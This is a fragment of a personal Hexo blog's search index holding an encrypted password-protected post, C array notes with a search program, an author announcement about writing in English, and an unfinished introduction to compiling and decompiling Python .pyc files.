34625668e26d696425fd3b1cccf4d79bd7c4eef2069048e40b4d34af3e35d70cc260fa5a84cff52474ca2049d95fc6f11e6fa3c74634cf5db2b49dfd08c4b21e679480ec020a312c84fe6a870ed1f75e586cd78be95802b064c0cffe87faee9b4ca1a12a48f2ff3d50846505432dca4f4652fcd32da226e950978e4f0991dd48361beef2997efbbd6a5cc569f43ace578bbd9916674890f57b21a80b452fabc9a1c4227a81e90c2d9a8e9268a5fab47aaa4e0afacdfe0d8aa8f84f270e1419607f1d45d22bf00ae23f149a3557fe95f008a78dc0c27e5edad0f16bb95cc69c0c3bdec305d20f27c7240556c664fcb05a82b71b8dd3a6355f34ee72e52c2e358262de5a4d2c7845f4b294c24f54e2c8911018710827de39cf2840852c0e5c1f30df49175605a75f710580df278aaa0a09d8530e73633ca8c32159977c50c357ffca2753cdf6df06a857746625fc00716012f62f4a72bf019703234366c5c174720d335f5d580f7521ce2ec3ebfb7d7f3ad72b4f5eadb1a5fbbc50253f72898f58d804fced40f72d211daeb5e5e2fb8a912d96ea3eabca6468f31275163fbfb3f3835380ac5beeeb14466cb59bbff73089489eb0e2a175fe2f6fedef4edafedd1a24cdb4c97e1cbc8029b1321c65e6fa6de3249ab5dd1c012fccacc00c16626947b23f68add4f28aa0689488b28807816d7f6ec539d064428d49e1feeb928770196c9108efa36abfdffa4cd4d2463dcb040f18df6382eefbb5bb215ef8c39b2b20006af5854b5527222bcbb1ab0915777cb8b1befb09edf1a769d900e5a57b04877782b2dabc81925e1987e8de259bd457bade797ef0d4bc609f67a9984dbaa6c944454f940e7fff6fe7e72b86cb6783cac413976050556886a237d8f0b8d6c7c92156e5c71a4740ce55a9ddfafc4288f29e48a96fd3b08edc1d70b57beacb9be652f7719a973ff207cba2f5a26854381c2823ffb62861d74108df1763708b611ad35c00a6a10eefeeee506a1fcef905cb7b636789b34f38b4a9ee6d698786192f2321c24e607fc9ae0dc0b8447084f41fdb43037809ea8d5c04024cdb7ae612e58e783443e411c5fc23d25767b8ceec2f2534fe46f8df1c41d787564797cb5ed2ac9f6e969d557b6e44640d7bded7106a37acfb7bc18bba2d493d247ea9bf6f041583a1b7ff9e7d5f257a1f2b1422c6d79f0394a7be79baa9fafdb7db2c5e53d3d0466f202c91b42a5bef3ac4a0562950501be2ae5204928e12825e067fa0ffe1d1e7df3ff679de2a5588b32c9954482038be0767c1ace486bc8c28268541a0df610895a84f44ac9cc1a93d55a0eb3fcb6b49d93ad3280e521b249d1ff8071d8d84ae6313e4b72859f6261b330554dd212804ec35610f3ee0743352befc3502ee7828717dc70b25b6c87572c782dcc3db0beb7df1dc1ef85b45d48c546700b79541442f7d15b9b9083cbc67bb4bed843839dde2c80930d97265331734a8dbe6247e2debbba071bd9e655f6171f212fe1279321c0612966811b2baa34bb760acad163c489fb1575f472f4c3cd765c125fc4c5d444e170800e977021fba7a6146bec7d416e1e59bc46747ef7f86f659c9a6e9a2370b1a14eb76490913226503b3d6d495e8e6a31afc45880ba7b7aa3894310b4017855e06e40b9d66e94016814e64281e525158002257064215c0c22fa1c7444b0e8fbf47adfe8bdf01b12bb16b8bbc4157db50d5c42a48dff7134eaa9041b8dd45f0add955537981c158aa0a570e73bfd6225fabed7e7f516d3bd4ab6e8c92ea65c7bb02e7c5f6bf8a616c9bcc4b1d41c89b75db8726f59d6b21e0e2714f72fff239cdba982ddf4a87b6c04eaf803f5d6d3b2b92e37f15bc2bbcc92285a5521e2c1b3bb4118a904e23b586ddc1948919dee8ddfdf01a528e2259d046dac2b455df9a6130f0e673455e8c80ae48e89211092916a2ca4e114b5f4717490c191f0b273da9b2a10fe979751d95d6dba2f9502537e9c034165d35f567d5a84029434e2c1900bcafc8c524258c6fbcf8b74c34ac6b830115f09da0ec0ddf30655ec6620f4f7489a474d5b5be6a57ad59895b0843f0cc774f652c324cb2a3f8db107e14b3cac54f05f37dab9820d43f2e67f43900a3f6cc9e4dff1211d78a3472b324045b1981ee46a62d0e8b621a835d6200e60cb8c6309b8035a3bb482a5fcbe47393cb357c94320afbf0698c8559fd7f3a5816bd8b798ac6deb87a26550873d77bc4a217c6e700cdec9250a9685976cc11e17a9da8e71e77cf0eec9598b4d800cbc9034927e95030b783144b9b0aedab31469c90fe6174831f74ebead106b58b012c5aaff3cde53e876e8cb91a7ad99fec42a42bd9c1e47bd31e42140decc82bfe001f83a153919d1fb539e7995f524f323c2fa1685efee7377ab5b21f5a153ac6ec1d5ea720e8dfa95a2a644f6a71a6ff02fd6dc7265772a34a1a856864d072a7290c2532e582186cf9c2ff352723fe9040a5785a3e4df2b10848f8b7f1d874b82f5043798f342e3b0608d16252a6484af63d6969d047c61bf76872fbed1529a574e7b699f5e9fd4f32bcd82096376d22c111a89b8412cc8314e40ffee2a0d60f4a61a1165ac5564d264eea9d8f6e18463b8b876ec6ae38320d04f2668f416db9ddf3a513e64eac11f24ccf54dbb1f311b640e2d3e6b8b91d0b7c6f3ac03c1af8b37a56f510e533198b2f8b72380bef9b8527876ec191f32ef29111662b81287dd6c193fcd04b305715d3b98dca4944daeba5c8a8366503b823c6f928927ec4ceb96237e9e841ac2d4a7c1066ed45d4a347eeae22cb4a913b76cdb1d40304af13a53c429edd54725afb8f7ff86aecc5cbebccb073ee29ffc2501bdef57d06c6a04f2a28b74bcb51a694c9ee05c82ad87927c266da25d22246be924f30fab0e4fa15760b700952975b1c0bb5844322f7b77ac3ce71542f2d2616385f85ffeb1ce665c588384f47447314b4d20b57a58dd2d141d463bf0173a146f115b5eafd7ac939ebd0a78304cf38f72ae75227505b9ba7d32ef2ae1e65af6960bd0b4fd2a2185785d90b0c6f6ab35aa69482a4dc45ab966c8c425e84109156f6acdd21e98b2f94a23b53ea046e1368b1fb985878531095be7096bd36f5b7aaf317ddcf5154549c482c50fb2fa6688c840e384119d151c71e58c0dfa88c4cb88d51027628c07a888cb3685a08f4e549b7871ca22c4535be7aa3b14eca640c3d1059ae96b92b2a9ab05e8ffe63bad502f021c243c986a498868dd9eed70d65754c16dc95b4082edb6733fa56cb6b84a85d0e8bc4982bcb96a1f2ecfecad2dacd47b19fcf02c5b39df759e25f8f6ed23c968bdd012cf25476ceacf4960b48c0ed8dabb69d52eb61e57d4790658f8358ef3b5c76b3c64559e454c0979e52a3d83b9e833312de0aaddaf0b94566523500b4d6390553ed1528af27d679357f3810f7bf3d3bd5e2590223c022ad91cf9ba1141a7c9cf835ff97975b18deaf9c84d84c0f320e9901357ae34832446593345b49030f8d2f8ebd86044ed4b39b3701bc99958e3625de6f15ac50551551977a04f0b86e81729205384a984d23e939998a2690acbf752437ad9d8a12c5de8941379176f9845cdd81c2ae77a8cff57cda7fe2ab3ef1274e7830e84fa00691195ed37d0922da46d289cb63fbf269dbfff1147292894482a2adc5731eab6965563381323ea17b3f91bae67da2dd57799b2262fa4506097ba7fa57b5a1d536baf02768021778a8ff2b83a64c4378ce93651b19cd35b5d8fd254067f26a23918f13f6c141d5dfc57c75ac7df440350a95a5c9c723af59aece23afc8893028beff636cf0f09491f2a4ec05bfdf68c07e8e75b6c8c05f72e988a666ed28c70cd77324cb2c22d4090dd7b365e5ee6e77ff2252ab465bda5c6a7d25fbcd6aea6488d10b9ee312974d460251a472f9381d2f47480ec2051093686209458e672d20ceddfa0950e9f21131d5becdfaa6b782a39b994444548ab99d5adb1d35ccae3375d6d241d8537849c606c5fca3f7c15de4090e57ece27e2ffc9ee6c8c445ba2297e3fa8639796cb0b03dae73a1df0b697c0521dee7f6ba217ad767515719fe7cbf8609d94cf2c399074721b56136c0cb248a8165d292032f0b1ad103ca9b592f7865197e4633d5ddf2b85a1cc98eccbe61ce0fad79d26a401e9ef458b297512a510837eecdbaeb31bbc7482308feb10acfe4563794602ed3aa8d9eb9eb9de4d73c8581f6d89359054d91e7e079ae4ae0a10683e0eba2f5d3512b65cc6b551e33405ce642c8906e3f592d35ed298a7c5cdb3f1710449ea1aa3d6229d99d6761487203005188c59e2458f01cf8a0730eec5e9066db2a405c2f93c17c267c29951c4645b6d4e2881959cdb8aba4e37f4a2470cba12eacd656687296e93a3ac18473a5f78c77f2334866b83d8aebe61903f537abdaf2de7ef9d25ed3e370ccba0f11308da7375676fc768811dea1b63df893b7f7384ac59cb6df4c70123081082aa7d0d8763eff0bf07de0974bc31caaab2971e0a5bf5a56c42d2c7a07f366cb10059e05e397e11af5a79be124edc08eef54c808a501cbd8f662026bf8ddbf0d7dbffdb1fd24c90ea5c4870e57363f52ee02f4fd95ea5845ea4f8fb49eb52963e8c54773e22fae3546ffe66dc25f0eee26f959813c6397df10aaea49cc0f62dd69da27071b4e0fc01ee55be64d44eae6149a4e08da952e366b53c0858945a0ec67e56ab25346846e67e06d787f4f61089f2bb5bdf441ba0e01e2fe97228bb33dcd8708855d97236764f3690d9287bac287e476ab7f601c66926a9335b869168f0a01f079b96cd7eb6e0e4f2028cdedc857ae2827f24de62cee9b2919392a45249fba330e61ae42de386460d2c0f7c658fb1aa4d370aad886c5f74a118951aaa62dcdad4d7f2df27d164bae5d681b51b8ca567d0b33501a43bbadb6818b902dfd5b6dd2ee58abec0b3091bd0756404a25ef86182922117e4bf10276e38bdf15b1a4b188c45735097974aadb694b6476bb3de1bad077550d0ce25370f3369b5d7924b9e1d0e125bf08d79966f4d6dc56ebed25f62f1f54ffc3c0a9d15ebc47dc58dcbe77f4016530bd094dea39a986104e7c6a593e7c559503d07c6e101febadacb9cea6c8de57873aca4f6498c294599e43d97a79aeee3366e7d638959fd5406d2831ced0f5e9b660a8a22e1bb30e4fcbfc272e64f4e93d01a9311dcd56f64cda385731a95d353b7c159fb128a31be5341510166c69761b0257868da787ea8a4526a81fd9172985bb383312aec23588fcda9cc71484b6e680454497ac86cbc78783f9fae50fcc1a4e9cf28b71f5d912d2d136573a61c6c8c40e3574c2e7c09b65b1f8883284af6b5663ecc6e838bb7b2a38f98179c65a5a717a7d6f9bf7e1141eac05978a885ddfd96854b5fa30017e3e5cbebee5e4047192469548072245c2d03a9975698f6d2dce0a3eacf05a7ea40f2ea0e93a70b52858896ccd7756f5a197da8094990442c805accce5970bb57760b7a8d75397f1992817b7a4d1553ab9bfb2cd0259b4bfb7ff26334adc38ad985f00edede861aa1d25cbb211a684e399342faecbb5df115c05f2b47c7cd12089e39a243ac8a59c4e69a0fedafc4e91b84e202733a3efab21a56e504315e9b53660e0304cda793dde3b51423857316a19aba8642bba3f3ea1002bca5401d18ebeb83e560e17e41a1f85c1454889c396eaf4ca71f2c8a62f1c7517c6ddbd3ba12a625401fdd8bc94d034c5b1a0f4940090d2a07a7e8713879016ddc0a1261ebf2775f5e5b9a19f14d3ac0538244fcf62cecfa873783b8d0bcbac87b52d64c8fc08993f37d91a03a54e654298545267e67e15bd420758fb9b2eba288ebc36954ff9cb552145e3d708ba2b35c625f82d92fd5eb90f32989cf926243af94afcbc266171e03beba6c5a2ab9906f8928d5ba27d6c9781280cf93ed02e3db54d6004087a956874c48987432345c958be906c0b2166d27ef78768cc9eeec4b7c4a00da24116742a51b15902a168466216a50a980fc4840558ea30ab549aff2e844470b754d736855d772c6bb65595f25cda7396bffaf70d21a4a8c495647ad815fbd968658255993e08351d3f5e775ec6c4ab4560c10571cbf8362d90da0cc4d2826aaa0d64715fd31704ab92fcb456eea43e699b6bd07c1d2408f7dd2e7a0ee7c98e38641a3fe3f2ae0722f666e8b0f35d9e8814a5c3150973eb3ce90b48a658f928225ab3ba999b418fbc9bb795d5286c809d445b8e99f7fa1172e9b19512dc44f69530a0115a1a5a8f891e5fff3b54943e66e2738b871d07e72531f59421847c3024a8717e66bee6df1436290a8cb16b123b544084625240202f616a7c86cedf159bf0c89fe38cfcd1d4167a2224b211cfbcde47bdb0b66c0f4ce3800c33912d5f0f576cc264d4dc2be4189a570c9441d3e57c985a9ef2b9c394625fe114bab1162cad16a38a210ac136ffcf02c78489424775b729243578cb240833d9809bcd77906b85eefb4bbf41a4b316b88e755ec7a617b6985bca72a3d371eb875171409530ecd6d2d30dde3b9884942806584b2dd93c303e89bf65fc2a705a71c0e9b52197f3de2a8b10be70a14a2708f1816f15451855e42c3ccc8e75813de637b507390d9045b8cbec9a1d3d3dabc61e554255d49b84c4e96ec43398e531df43f571149036cebe6bc356a6f04fcacda79b9e34021a9a3964a40dbaf8499685e57cbc62e1bfdc7b5d29111860e40e3b1effab5cb9a8bfce12a50a4e9c4f76dafa9c3361400dc2c1df7fdbc7becc8f5dc5376a3988ae15a4af0d332448310e1ee90ec31304717b0889f688de63d7851b97b542af0e69355de15e5870a37fab92a52a802e029cfdae8cb0c88d84de539a115aa3a4f1f0195d97d4c120fe985c6c5148871d4ec5bdb0d5915dbd00f0fc756b6ad4040e9c5e1d7c2f0a2009d54f0af1db4ddb6647d4829ee01aa2e8d7edb61c7401db2ca1fc9174e8d25814fa84d8291af768c49d2ad10676962db42647576db75a190fbd2eec05efd60c54ea7755b0342fad815503ffd8a5ad73c5685982537f60e358324a2210b29b28e128c97ca537a9f4be4ef5d8bb14da05dffca10bf3f496917757b9aebef24eba87642744d543a0631535b5ea9313ec4953ec1b522ed9ef1f49a355d65aa91497c3fa9f573a69ee2a0be68d2c70da2c0058af512de808a4050844400100c2963c436031e78dcd135f1dac43090a08bf3532713d88c30c1bf8cf12a4610ad713ea7694902b9848c4a504739a0650936db13a61a9b8b9fd635d9cecf1b53be113a0188fc6928cafa0dd8fa28dbb5f47c0bbffc8cf0fa9633e2d0e1af3a8e95f687bfc00a4b5f995fb241f830ef384706a917d37837972f39a3b10c70e2e978e4cb4fcc67e5aae449be763c4ab963fa964b56746c58c1f33f4390d551d2f2841f64bcee843148d2cb7f55cdeeb5ef00d99d6628c6ef24af283b784ad0900f894bb5d3045fc49953ef5cbbc8dec602e5e725aab6f375060507ffa79cb0f4fe468ae49ad80ce868e240635ac6b13930cbc61ff5785a84dc678925eb5e80c43ab0e0dbc78b6313d3b458fde38c6336e48baf2943ff3f7bd36fad663db80cb94cfb4332603e8945dd56a608dad732e5fc7834859b106c1dcbade49169d6873fa3e93583f56947cbc545810412fd77745353527158488988d6b02e2478d77757412b2bc612f41b989aea40a01a6b20f01e792377850eea59cf20c4ade4187e6edaa22b15f5ee2baeb49fc63e0ca908bc4e31aebfff3e43ab5ea67c76f93166db04724716c5099eefbb4c6412558dc0f9f3d556a92369eda4a29439afa348688451b45b1eb8d73d6b0d5296477dc6ca157480e85e8a8c774a417a70f12254322208324e613a35d75629e1fec5b7ae976d9f48888e7a1ba63f42369b5455f593856d1319d3e200727b055db5807f9a403e30c6d0ed0bc7d3fd0f3b0bfbfe27d404ca38cbc60079f70dc7719535cc163f21a93dfc72adaef721c02c61c31b3f22d9542964a1ead448aa71735215ae4d44476a80cbca749709364ec9977b4238b9d3d3e4b8c75dba36de618aa6700931504a3e92f9dd6458833fba4ea8b695a34d007bd02175a2a36fe3f165b31f08134935b5bd98f07537dc20d3625dd1a1d171f9268e9e4c1c825857915ea40eb254ba8162f4118327e4729fb33b70ce91655227727793b1fa629df3ff582108ebd44c7641fb1b7880cad751c500279aa806972d99500338aa1826f8888e8795911935090a8297b37545a381efc749fb3e94714c5d40ffb20d0884aff009315b2875840e40315b282d7914efb984c108961b08ebe06ce5981926d62bfe4acfad7500f51bd35d24dcbabf05a23519078be7203f067b96275f37c93141306372637b6f3b9deb2562bf5ed237426ce498c5214afe43019b9c4a60731a9d4f52d804338c3260fee9c0a13441673209920cadcfd08f5dfb0bd6cbcf00e92a67cf7e4413222d1458c22bb3492817da119ed7b3e9aac0e18cc8a8ad2ea7747d992b6c6305494844e4c86af587d77ec204b9d389455a9a758d89ecc3fbdd1b092364f345baf1c33fbc168371c185ef4d230713504c0feef6f21d912fbc7ed057d0006046bb2d393dd0f105d875c8c522b882ec73960c6423cc8c728be7dcfa9ab9ab56400b0fc871f9cc20c627d4594e2b5d51506cc01268ef966f8b29a6f97972e3de5cc0aba34e438251b824a592a1346137a1e04e6022ae4366746704ae912fa72342484dc7aaee3d0dc37fef9d0a2c01c0dfa92bdad2dad8e87bd4b073d5fbf1c4c28550de67798d637d97e9dc831b41743739b062d76b824283a0eb4e2e260b94496036300d0062bbf3f521aaa3b01e013a4be3b7faf226eb568a2f58947debb80bfa3b1843c9db73e765c5228c3d03db3fc4ed9374cde926e7f6f1b565ec561a38ddcb81669f2ec1ea9fc9a21d965c9e89672da5812d1451b5a589542f7c1453ffc0e0c0300b7726c0c3e0375aa5adb9cbc6351d6146bd8559ba12ff254d5df81c2c86453385986c2ab650d70df9d6d7f1bee4ee812bab65bbd7030beaa51d340029d4d6f06510192ef1b4f1e31831c33a87f743ec520d747c43cde101f2b054353247993a8eb374e3b554765c5e0841ae1451c475f317e92143efc3fe9d8584aa1c62d85891154613dddc81a725494efa3c2ea63f284d989b47f0ca0c64f360d889113a7e2b5a9a23a907502e52f68d3123726f796eaa67d77592928b725384056d248ed30e504efa0fd819f69c8153b425eea526372a8903d5a60863d3fd2ca184498e9bdb4345fb9da342196da32c58f14071fe3ec62e3bb0d73d4567c3660d3a27d42d04e5a79e51a8885b01742f7cd1218b3dd18c7c7e5fbfda99b90c354c503cdd6bca2fcb306c5005b39ebe631df2d20c1e0da1f53308508fdeeee77b31192f1d858e8680dd25a9971d3466660f12a223515420e42927f3312f7fb47951f015ed3d84c35950046713e4691796a32219f2e04daca288ab5b0d266732b4af7965a163b41655fffb0740e97d7f9c1c537d0004b2138130ed162103ae7d38bea892b04835bc959742a5c9a0901f3f96964788da88d174ce20db495d64e80f48d0ec0cc80431733b2936c3e9764eda965f3e0dc639d5eb8a82fc858bc5a79c60abf0f0f7fd5b1a5f0059b4ce8704438bc36da0ad3cefbc215690b050cdf1527fa29b69690488090188265f96821d1b82e8dddf643ad1ffff0dfa7462f497fbdb311c2ff4b864a6853905c2660821ae7f45f7149b14a7f646887bccc47b9988dfe25d7a32e4507e5b806c8ba2db4105528610a4955d41b0462727c3497119d1c92b06df004b23fa025a327c7e18590acb2e565b4dfbb99123d3ce29cff9556d99e9f46f3b181c43becb5d45264ea7387b92ab4ac3cd3366b85902c4e7f0023f83bb171419ae12b68601aa9a3b168d44d53cb321b116f3099dbb47802c322f325f10ddb07df6ee0438a468dbc744fa24ff523ef6c0ffd478705a085ca63089677194c2e611f495a4f0a6e6360f35ee0a5159e0e347719ed93e1eb43fd9861808e0843f6bbe5f29c4450d1ca6049bf14a703a690cda0f7fd8c03f2c3a02ed1de1da60dc9d92d60c0fffd07071727e34de6121daaf7618effd2f7f936d5a3c0a26b9d0907abeadc5e93667ef1c4ec86a4195992b725abcbb8634cc55eb526165a269abc9bb782720457e8c6123b690b965ec659b7c74a13a972aed223fe58d378246a9c3199624e682b0abe8a7f32d9c430f8d6a8b94cbbc5f312928acefabb1ca93373a1f61554332a83b328ee20c8ab3fd85f43551393a119a7cc79058ce80a395f58c091798324681c5ebc9964a7fecaa8cbd28cd34fa0f06d9d4c1bd777076471fb82693bc31a92bd0bc7a3eea80b36578b84e4a1eb885ebb86c131e88c2f7712146cfae294ad601f95d3cb48d6e89501b61eb04559767ab0a966950bb3c396bd8146d3a4964594b81764b53d9c51cd5e7552337d2dab347872866ff1dffb61886fac0d70ba4077619205011dc995c85e346bd2e7713f56af9b131fb885b1236c8118d0d8320cb80ffc6791cbd59935251662b71af05f0fc1ea5fe63fa59830bb9246ce903d62d6d2cd9814268c20e7324d9aa09fbb072f9a805520604da8b51247c5b193c3d1748f04661fc245fad3bb9aa8444486c25748b7bf283b228d056da191d0c674a26cd529942a13ae3ab22b6f2f2d4fc2b9340121f552a61e5af8dc3f245d09a9d652d8d2fb4a02c89fda8850a69fcb8e0a692f106ddd7f123c426b16688d83f7a9f652363c3477be317a9438aba98b3e13701cd6</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>C语言学习笔记之数组运算</title>
    <url>/2022/12/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E7%BB%84%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<h1 id="Array-Calculation"><a href="#Array-Calculation" class="headerlink" title="Array Calculation"></a>Array Calculation</h1><p>数组计算</p>
<span id="more"></span>
<h2 id="Array-Calculation-1"><a href="#Array-Calculation-1" class="headerlink" title="Array Calculation"></a>Array Calculation</h2><h3 id="Intergrated-initialization-of-arrays"><a href="#Intergrated-initialization-of-arrays" class="headerlink" title="Intergrated initialization of arrays"></a>Intergrated initialization of arrays</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>give the initial value of all elements of the array by directly using “{}”</li>
<li>don’t need to give how large the array is, because the compiler will help you count.</li>
</ul>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545408397-a7c349ed-59d3-45cc-b2a5-acdf1e6f07c5.png" alt="image-20221220221006157"></p>
<h3 id="locate-Intergrated-initialization"><a href="#locate-Intergrated-initialization" class="headerlink" title="locate Intergrated initialization"></a>locate Intergrated initialization</h3><p>postscript: only C99</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>] = &#123;</span><br><span class="line">	[<span class="number">0</span>] = <span class="number">2</span>, [<span class="number">2</span>] = <span class="number">3</span>, <span class="number">6</span> ,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>locate initial data by [n]</li>
<li>data have no located will attach it to the back of front</li>
<li>other location will assign zero(0)</li>
</ul>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545380586-956bd832-4611-4aad-a884-1b5b7b47f225.png" alt="image-20221220220930328"></p>
<h3 id="size-of-array"><a href="#size-of-array" class="headerlink" title="size of array"></a>size of array</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671545579702-5633e418-75fb-4e57-b313-1870bea151bd.png" alt="image-20221220221253372"></p>
<h3 id="array-assignment"><a href="#array-assignment" class="headerlink" title="array assignment"></a>array assignment</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671545697239-01628869-393d-4d93-9135-9b35bdcfed07.png" alt="image-20221220221448348"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545786976-c9407dfd-cbae-462d-bccb-7af6d8019975.png" alt="image-20221220221620643"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545915883-d1042d51-4fe1-419e-931b-6ed3923acdf2.png" alt="image-20221220221825875"></p>
<h3 id="full-of-source-code"><a href="#full-of-source-code" class="headerlink" title="full of source code"></a>full of source code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> a[], <span class="keyword">int</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">int</span> loc;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	loc = search(x, a, <span class="keyword">sizeof</span>(a)/<span class="keyword">sizeof</span>(a[<span class="number">0</span>]));</span><br><span class="line">	<span class="keyword">if</span> (loc != <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d在%d这里\n&quot;</span>, x, loc);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d不存在&quot;</span>, x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> a[], <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (a[i] == key) &#123;</span><br><span class="line">			ret = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="An-example-for-Array-Calculation"><a href="#An-example-for-Array-Calculation" class="headerlink" title="An example for Array Calculation"></a>An example for Array Calculation</h2><h3 id="determine-prime-number"><a href="#determine-prime-number" class="headerlink" title="determine prime number"></a>determine prime number</h3>]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>一则公告</title>
    <url>/2022/12/20/%E4%B8%80%E5%88%99%E5%85%AC%E5%91%8A/</url>
    <content><![CDATA[<h1 id="An-announcement"><a href="#An-announcement" class="headerlink" title="An announcement"></a>An announcement</h1><p>Hello, my friends. There is Maple-ice. Starting today, I will write articles in English for my blog. This change is painful and difficult for me because I’m bad at using the English language. Even to this day, I don’t pass CET-4. Maybe the decision will make you feel astonished. However, it veritably happens.<br>In the past, I was good at compromising some failures, especially those I was not interested things. I don’t like English. But, if English hinders me from studying CS courses further, I will not escape.<br>Despite this, studying is usually boring, much less studying English. I don’t need to pass any exam, so I hope taking study English is a long-term challenge for me to overcome.<br>Now, I’m ready to face the problem, but where can I take the first step? I think I can change my blog because I enjoy writing technical articles. And I always read them when I encounter problems. Then, the announcement was boring.<br>When I wrote the announcement, I felt unprecedented difficulty in English writing, so I had to use the dictionary and translation software when I thought it was necessary. And when I have completed an article, I will use the grammar checking extension to check it, which promises it is enough to read and understand. If I need to use some technical terms, I will mark them in Chinese as far as possible.<br>Thank you for reading!</p>
]]></content>
  </entry>
  <entry>
    <title>python逆向入门</title>
    <url>/2022/11/17/python%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="python逆向入门"><a href="#python逆向入门" class="headerlink" title="python逆向入门"></a>python逆向入门</h1><p>施工中。。。</p>
<span id="more"></span>
<h2 id="什么是pyc文件"><a href="#什么是pyc文件" class="headerlink" title="什么是pyc文件"></a>什么是pyc文件</h2><p>pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte  code，py文件变成pyc文件后，加载的速度有所提高，而且pyc是一种跨平台的字节码，是由python的虚拟机来执行的，这个是类似于JAVA或者.NET的虚拟机的概念。pyc的内容，是跟python的版本相关的，不同版本编译后的pyc文件是不同的，2.5编译的pyc文件，2.4版本的 python是无法执行的。</p>
<h2 id="py—-gt-pyc"><a href="#py—-gt-pyc" class="headerlink" title="py—&gt;pyc"></a>py—&gt;pyc</h2><h3 id="将单个文件转化成pyc文件"><a href="#将单个文件转化成pyc文件" class="headerlink" title="将单个文件转化成pyc文件"></a>将单个文件转化成pyc文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> py_compile</span><br><span class="line"></span><br><span class="line">py_compile.<span class="built_in">compile</span>(<span class="string">&#x27;test.py&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python3 -m py_compile test.py</span><br></pre></td></tr></table></figure>
<h3 id="将目录下所有py文件转换成pyc文件"><a href="#将目录下所有py文件转换成pyc文件" class="headerlink" title="将目录下所有py文件转换成pyc文件"></a>将目录下所有py文件转换成pyc文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> compileall</span><br><span class="line"></span><br><span class="line">compileall.compile_dir(<span class="string">r&#x27;C:\Users\abc\Desktop\release_project&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m compileall C:\Users\abc\Desktop\release_project</span><br></pre></td></tr></table></figure>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/HByang/p/13223118.html">py文件转换成pyc文件</a></p>
<h2 id="pyc—-gt-py"><a href="#pyc—-gt-py" class="headerlink" title="pyc—&gt;py"></a>pyc—&gt;py</h2><h3 id="使用在线网站"><a href="#使用在线网站" class="headerlink" title="使用在线网站"></a>使用在线网站</h3><p><a href="https://tool.lu/pyc/">pyc在线反编译</a></p>
